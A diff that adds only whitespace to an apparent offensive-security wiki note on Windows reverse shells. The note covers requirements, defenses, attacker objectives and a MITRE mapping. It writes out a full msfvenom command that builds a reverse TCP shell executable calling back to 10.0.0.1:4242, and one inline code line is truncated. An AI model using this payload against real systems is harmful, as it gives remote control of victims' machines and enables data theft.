@@ -36,11 +36,15 @@ From a technical standpoint, this technique involves using the Windows Reverse S
 
 The business value of this technique is that it allows attackers to gain access to sensitive data and systems, which can then be used for financial gain or to cause harm to the victim organization.
 
+ 
+
 ## Requirements
 
 1. Access to the victim's machine
 
 1. Ability to generate a payload using the Windows Reverse Shell Payload Generator
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ The business value of this technique is that it allows attackers to gain access 
 
 1. Monitor network traffic for signs of malicious activity
 
+ 
+
 ## Objectives
 
 1. Gain access to the victim's machine
@@ -58,19 +64,31 @@ The business value of this technique is that it allows attackers to gain access 
 
 1. Exfiltrate data from the victim's machine
 
+ 
+
 # Instructions
 
 1. This command generates a Windows reverse shell payload using msfvenom. The payload is designed to connect back to the specified IP address and port number.
 
+ 
+
+
+
 **Code**: [[msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0]]
 
+
+
 > The 'msfvenom' tool is used to generate custom payloads for the Metasploit Framework. The '-p' option specifies the payload to be used, in this case 'windows/shell_reverse_tcp' which creates a reverse TCP shell. The 'LHOST' and 'LPORT' options specify the IP address and port number that the payload will connect back to. The '-f' option specifies the format of the output file, which in this case is an executable file. The '>' operator redirects the output to a file named 'reverse.exe'.
+
+
 
 **Command** ([[Create reverse shell payload for Windows]]):
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -93,3 +111,5 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse
 - [[Meterpreter Shell]]
 - [[Reverse Shell Cheat Sheet]]
 - [[Windows Stageless reverse TCP]]
+
+
